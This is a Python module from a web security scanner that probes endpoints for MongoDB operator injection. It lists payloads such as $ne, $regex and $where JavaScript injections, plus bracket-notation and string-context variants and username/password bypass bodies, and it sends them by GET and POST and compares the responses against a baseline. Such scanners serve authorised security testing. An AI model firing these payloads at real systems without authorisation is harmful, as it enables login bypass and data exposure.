"""Python-native NoSQL Injection tester (MongoDB operator injection).

Detects endpoints vulnerable to MongoDB operator injection by substituting
query parameter values with MongoDB query operators:

1. ``{"$ne": null}`` — always-true inequality operator
2. ``{"$gt": ""}`` — greater-than empty string
3. ``{"$regex": ".*"}`` — match-all regular expression
4. ``[$ne]=1`` — PHP/Node.js bracket-notation variant
5. ``[%24gt]=`` — URL-encoded operator variant

Two injection channels are tested per parameter:
- GET request with URL-encoded operator payload in the query string
- POST request with JSON body containing the operator payload

Vulnerability is inferred by comparing response content and length
against a baseline response, or by detecting MongoDB-specific error
keywords in the response body.
"""

from __future__ import annotations

import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from numasec.core.http import create_client

logger = logging.getLogger("numasec.scanners.nosql_tester")

# ---------------------------------------------------------------------------
# Payloads and detection keywords
# ---------------------------------------------------------------------------

_NOSQL_PAYLOADS: list[str] = [
    # Comparison operators
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gte": ""}',
    '{"$lt": "~"}',
    '{"$lte": "~"}',
    '{"$in": ["admin", "root", "test"]}',
    '{"$nin": [""]}',
    # Logical operators
    '{"$or": [{"$gt": ""}, {"$ne": null}]}',
    '{"$and": [{"$ne": null}, {"$ne": ""}]}',
    '{"$not": {"$eq": ""}}',
    # Element operators
    '{"$exists": true}',
    '{"$type": "string"}',
    # Regex
    '{"$regex": ".*"}',
    '{"$regex": "^a"}',
    # Array operators
    '{"$all": [""]}',
    '{"$elemMatch": {"$gt": ""}}',
    '{"$size": 0}',
    # JavaScript injection (critical)
    '{"$where": "1==1"}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"$where": "sleep(500)"}',
    # Evaluation operators
    '{"$expr": {"$gt": ["$password", ""]}}',
    '{"$mod": [1, 0]}',
    '{"$text": {"$search": "admin"}}',
    # Bracket-notation variants (PHP/Express)
    "[$ne]=1",
    "[%24gt]=",
    "[$exists]=true",
    "[$regex]=.*",
    "[$where]=1==1",
]

_NOSQL_SUCCESS_INDICATORS: list[str] = [
    "welcome",
    "dashboard",
    "logged in",
    "success",
    "admin",
    "user",
    "coupon",
    "discount",
    "valid",
    "applied",
    "redeemed",
]

# Bracket-notation payloads for query string (works even on POST endpoints
# when framework parses both body and query string, e.g., Express/Node.js)
_BRACKET_PAYLOADS: list[str] = [
    "[$ne]=",
    "[$gt]=",
    "[$exists]=true",
    "[$regex]=.*",
    "[$ne]=invalid_xyz_9999",
    "[$nin][]=invalid_xyz_9999",
]

# Extra fields appended to string payloads when the server rejects object injection
# (type-validated fields like crAPI coupon_code that must be strings)
_STRING_CONTEXT_PAYLOADS: list[str] = [
    "' || '1'=='1",
    "\"; return 1; var x=\"",
    "abc' || this.password.match(/.*/) || 'a'=='b",
    "'; return true; var a='",
    "%00",
    "' || 1==1 || '",
]

_NOSQL_ERROR_INDICATORS: list[str] = [
    "bson",
    "objectid",
    "mongodb",
    "mongo",
    "castError",
    "cast error",
]

# Minimum character difference vs. baseline that suggests altered query results
_LENGTH_DIFF_THRESHOLD = 200


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class NoSqlVulnerability:
    """A single NoSQL injection finding."""

    parameter: str
    payload: str
    evidence: str
    severity: str = "high"
    confidence: float = 0.5


@dataclass
class NoSqlResult:
    """Complete NoSQL injection test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[NoSqlVulnerability] = field(default_factory=list)
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialise to JSON-friendly dict."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "parameter": v.parameter,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "severity": v.severity,
                    "confidence": v.confidence,
                }
                for v in self.vulnerabilities
            ],
            "duration_ms": round(self.duration_ms, 2),
            "summary": (
                f"{len(self.vulnerabilities)} NoSQL injection "
                f"{'vulnerability' if len(self.vulnerabilities) == 1 else 'vulnerabilities'} found"
                if self.vulnerabilities
                else "No NoSQL injection found"
            ),
            "next_steps": (
                ["Test auth bypass via operator injection on login endpoint"] if self.vulnerabilities else []
            ),
        }


# ---------------------------------------------------------------------------
# NoSQL injection detection engine
# ---------------------------------------------------------------------------


class NoSqlTester:
    """Multi-payload NoSQL injection detector.

    Parameters
    ----------
    timeout:
        HTTP request timeout in seconds.
    """

    def __init__(self, timeout: float = 10.0, extra_headers: dict[str, str] | None = None) -> None:
        self.timeout = timeout
        self._extra_headers: dict[str, str] = extra_headers or {}

    async def test(
        self,
        url: str,
        method: str = "GET",
        body: dict[str, Any] | None = None,
        params: list[str] | None = None,
    ) -> NoSqlResult:
        """Run NoSQL injection tests against a target URL.

        Obtains a baseline response, then for each query parameter injects
        MongoDB operator payloads via GET and POST and compares results.
        When no query parameters exist but ``method`` is POST, probes
        the endpoint with JSON operator payloads directly using the provided
        ``body`` fields (or falls back to guessing email/password).

        Args:
            url: Target URL to test.
            method: HTTP method hint — ``"GET"`` or ``"POST"``.
            body: Known request body dict (from injection_test). Used to inject
                operators into the actual field names (e.g. ``coupon_code``).
            params: Known parameter names to test. Overrides auto-detection.

        Returns:
            ``NoSqlResult`` with all discovered NoSQL injection vulnerabilities.
        """
        start = time.monotonic()
        result = NoSqlResult(target=url)

        parsed = urlparse(url)
        url_params = parse_qs(parsed.query, keep_blank_values=True)

        # Merge explicit params with URL query params
        param_override = {p: ["test"] for p in params} if params else {}
        effective_params = param_override or url_params

        async with create_client(
            timeout=self.timeout,
            headers=self._extra_headers,
        ) as client:
            if not effective_params:
                logger.debug("No query parameters — skipping GET probes, trying POST JSON for %s", url)
                await self._probe_post_json(client, url, result, body=body)
                # Also try bracket notation via query string for POST endpoints
                if body and not result.vulnerable:
                    await self._probe_bracket_notation(client, parsed, body, result)
                result.duration_ms = (time.monotonic() - start) * 1000
                if result.vulnerabilities:
                    logger.info(
                        "NoSQL test complete: %s — %d vulns, %.0fms",
                        url,
                        len(result.vulnerabilities),
                        result.duration_ms,
                    )
                return result

            # Obtain baseline response
            baseline_text = await self._get_baseline(client, url)

            for param_name in effective_params:
                try:
                    for payload in _NOSQL_PAYLOADS:
                        # GET probe: URL-encoded payload in query string
                        vuln = await self._probe_get(client, parsed, url_params or {param_name: ["test"]}, param_name, payload, baseline_text)
                        if vuln:
                            result.vulnerabilities.append(vuln)
                            result.vulnerable = True
                            continue

                        # POST probe: JSON body with operator object
                        vuln = await self._probe_post(client, url, param_name, baseline_text)
                        if vuln:
                            result.vulnerabilities.append(vuln)
                            result.vulnerable = True
                except Exception as exc:
                    logger.warning("NoSQL test error on param %s: %s", param_name, exc)
                    continue

            # If we have a body with known fields, also probe POST JSON with those fields
            if body and not result.vulnerable:
                await self._probe_post_json(client, url, result, body=body)

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "NoSQL test complete: %s — %d vulns, %.0fms",
            url,
            len(result.vulnerabilities),
            result.duration_ms,
        )
        return result

    async def _get_baseline(self, client: httpx.AsyncClient, url: str) -> str:
        """Fetch the original URL and return response text (empty string on error)."""
        try:
            resp = await client.get(url)
            return resp.text
        except httpx.HTTPError:
            return ""

    async def _probe_get(
        self,
        client: httpx.AsyncClient,
        parsed: Any,
        params: dict[str, list[str]],
        param_name: str,
        payload: str,
        baseline_text: str,
    ) -> NoSqlVulnerability | None:
        """Inject payload via GET query string and compare with baseline."""
        modified_params = dict(params)
        modified_params[param_name] = [payload]
        new_query = urlencode(modified_params, doseq=True)
        modified_url = urlunparse(parsed._replace(query=new_query))

        try:
            resp = await client.get(modified_url)
        except httpx.HTTPError as exc:
            logger.debug(
                "NoSQL GET probe error (param=%s, payload=%s): %s",
                param_name,
                payload,
                exc,
            )
            return None

        return self._evaluate_response(resp.text, baseline_text, param_name, payload, "GET")

    async def _probe_post(
        self,
        client: httpx.AsyncClient,
        url: str,
        param_name: str,
        baseline_text: str,
    ) -> NoSqlVulnerability | None:
        """Inject ``{"$ne": null}`` operator via POST JSON body."""
        payload = '{"$ne": null}'
        json_body = {param_name: {"$ne": None}}

        try:
            resp = await client.post(url, json=json_body)
        except httpx.HTTPError as exc:
            logger.debug(
                "NoSQL POST probe error (param=%s): %s",
                param_name,
                exc,
            )
            return None

        return self._evaluate_response(resp.text, baseline_text, param_name, payload, "POST JSON")

    async def _probe_post_json(
        self,
        client: httpx.AsyncClient,
        url: str,
        result: NoSqlResult,
        body: dict[str, Any] | None = None,
    ) -> None:
        """Inject NoSQL operator payloads via POST JSON body.

        If ``body`` is provided (from injection_test), injects operators into
        each field of the actual request body (e.g. ``coupon_code`` from crAPI).
        Falls back to guessing common field names (email/password) when no body
        is known.

        Also tries bracket notation via query string as a fallback when object
        injection is rejected (type-validated fields).
        """
        # Get baseline using the actual body (or a dummy one)
        baseline_text = ""
        baseline_body = body or {"email": "baseline@test.com", "password": "baseline_wrong"}
        try:
            baseline_resp = await client.post(url, json=baseline_body)
            baseline_text = baseline_resp.text
        except httpx.HTTPError:
            pass

        # Strategy 1: Replace each field value with an operator object
        fields = list(body.keys()) if body else ["email", "password", "username", "user", "pass"]

        for field_name in fields:
            operator_payloads: list[tuple[str, dict]] = [
                ('{"$ne": null}', {**baseline_body, field_name: {"$ne": None}}),
                ('{"$ne": ""}', {**baseline_body, field_name: {"$ne": ""}}),
                ('{"$gt": ""}', {**baseline_body, field_name: {"$gt": ""}}),
                ('{"$regex": ".*"}', {**baseline_body, field_name: {"$regex": ".*"}}),
                ('{"$exists": true}', {**baseline_body, field_name: {"$exists": True}}),
                ('{"$where": "1==1"}', {**baseline_body, field_name: {"$where": "1==1"}}),
                ('{"$ne": "invalid_xyz_9999"}', {**baseline_body, field_name: {"$ne": "invalid_xyz_9999"}}),
            ]

            for payload_desc, json_body in operator_payloads:
                try:
                    resp = await client.post(url, json=json_body)
                except httpx.HTTPError as exc:
                    logger.debug("NoSQL POST JSON probe error (field=%s, payload=%s): %s", field_name, payload_desc, exc)
                    continue

                vuln = self._evaluate_response(resp.text, baseline_text, field_name, payload_desc, "POST JSON")
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    return

        # Strategy 2: All-fields operator injection (auth bypass style)
        if not body:
            multi_field_payloads = [
                ("username $ne", {"username": {"$ne": ""}, "password": {"$ne": ""}}),
                ("user $ne", {"user": {"$ne": ""}, "pass": {"$ne": ""}}),
                ('{"$in": [...]}', {"email": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}),
            ]
            for payload_desc, json_body in multi_field_payloads:
                try:
                    resp = await client.post(url, json=json_body)
                except httpx.HTTPError as exc:
                    logger.debug("NoSQL POST JSON probe error (payload=%s): %s", payload_desc, exc)
                    continue
                vuln = self._evaluate_response(resp.text, baseline_text, "body", payload_desc, "POST JSON")
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    return

        # Strategy 3: String-context injection when object injection may be rejected
        if body:
            for field_name, original_value in body.items():
                if not isinstance(original_value, str):
                    continue
                for str_payload in _STRING_CONTEXT_PAYLOADS:
                    test_body = {**baseline_body, field_name: str_payload}
                    try:
                        resp = await client.post(url, json=test_body)
                    except httpx.HTTPError:
                        continue
                    vuln = self._evaluate_response(resp.text, baseline_text, field_name, str_payload, "POST JSON string")
                    if vuln:
                        result.vulnerabilities.append(vuln)
                        result.vulnerable = True
                        return

    async def _probe_bracket_notation(
        self,
        client: httpx.AsyncClient,
        parsed: Any,
        body: dict[str, Any],
        result: NoSqlResult,
    ) -> None:
        """Try bracket-notation NoSQL injection via query string on POST endpoints.

        Frameworks like Express/Node.js parse both query string and body, so
        ``?field[$ne]=null`` can bypass validation even when the body field is
        type-checked as string (e.g., crAPI coupon_code).
        """
        # Baseline via POST with original body
        baseline_text = ""
        try:
            url_clean = parsed.geturl()
            baseline_resp = await client.post(url_clean, json=body)
            baseline_text = baseline_resp.text
        except httpx.HTTPError:
            pass

        for field_name in body:
            for bracket_suffix in _BRACKET_PAYLOADS:
                # Build URL with bracket notation: ?field[$ne]=
                operator_param = f"{field_name}{bracket_suffix}"
                new_query = parsed.query + ("&" if parsed.query else "") + operator_param
                test_url = parsed._replace(query=new_query).geturl()
                try:
                    resp = await client.post(test_url, json=body)
                except httpx.HTTPError:
                    continue
                payload_desc = f"{field_name}{bracket_suffix} (bracket notation)"
                vuln = self._evaluate_response(resp.text, baseline_text, field_name, payload_desc, "POST bracket")
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    return

    def _evaluate_response(
        self,
        response_text: str,
        baseline_text: str,
        param_name: str,
        payload: str,
        method: str,
    ) -> NoSqlVulnerability | None:
        """Compare response against baseline and check for NoSQL indicators.

        Three-tier detection:
        1. MongoDB error keywords — always flag (confirms NoSQL backend).
        2. Success indicators — only flag when the keyword is **new** compared
           to the baseline response (prevents false positives on endpoints that
           always return ``{"status": "success"}``).
        3. Significant response length change vs baseline.
        """
        body_lower = response_text.lower()
        baseline_lower = baseline_text.lower() if baseline_text else ""

        # Tier 1: MongoDB-specific error keywords (always flag)
        for error_kw in _NOSQL_ERROR_INDICATORS:
            if error_kw.lower() in body_lower:
                return NoSqlVulnerability(
                    parameter=param_name,
                    payload=payload,
                    evidence=(
                        f"NoSQL error keyword '{error_kw}' found in {method} response "
                        f"after injecting payload into parameter '{param_name}'."
                    ),
                    severity="high",
                    confidence=0.8,
                )

        # Tier 2: Success indicators — only flag when NEW vs baseline
        for success_kw in _NOSQL_SUCCESS_INDICATORS:
            kw_lower = success_kw.lower()
            if kw_lower in body_lower and kw_lower not in baseline_lower:
                return NoSqlVulnerability(
                    parameter=param_name,
                    payload=payload,
                    evidence=(
                        f"Success indicator '{success_kw}' appeared in {method} response "
                        f"after injecting NoSQL operator into parameter '{param_name}' "
                        f"(absent from baseline). Possible authentication bypass."
                    ),
                    severity="high",
                    confidence=0.6,
                )

        # Tier 3: Significant response length change vs baseline
        if baseline_text and abs(len(response_text) - len(baseline_text)) > _LENGTH_DIFF_THRESHOLD:
            return NoSqlVulnerability(
                parameter=param_name,
                payload=payload,
                evidence=(
                    f"Response length changed significantly ({len(baseline_text)} → "
                    f"{len(response_text)} chars, diff "
                    f"{abs(len(response_text) - len(baseline_text))}) "
                    f"after injecting NoSQL operator via {method} into '{param_name}'. "
                    f"Possible query logic alteration."
                ),
                severity="high",
                confidence=0.3,
            )

        return None


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_nosql_test(url: str, method: str = "GET", headers: str = "") -> str:
    """Test a URL for NoSQL injection vulnerabilities (MongoDB operator injection).

    Injects MongoDB query operators via GET query string and POST JSON body.
    When no query parameters are present, probes the endpoint with POST JSON
    operator payloads directly (e.g., ``{"email": {"$ne": ""}}``).

    Args:
        url: Target URL to test.
        method: HTTP method hint — ``"GET"`` or ``"POST"``. Default: ``"GET"``.
        headers: Optional JSON string of extra HTTP headers for authenticated testing.

    Returns:
        JSON string with ``NoSqlResult`` data.
    """
    extra_headers = headers if isinstance(headers, dict) else (json.loads(headers) if headers else {})
    tester = NoSqlTester(extra_headers=extra_headers)
    result = await tester.test(url, method=method)
    return json.dumps(result.to_dict(), indent=2)
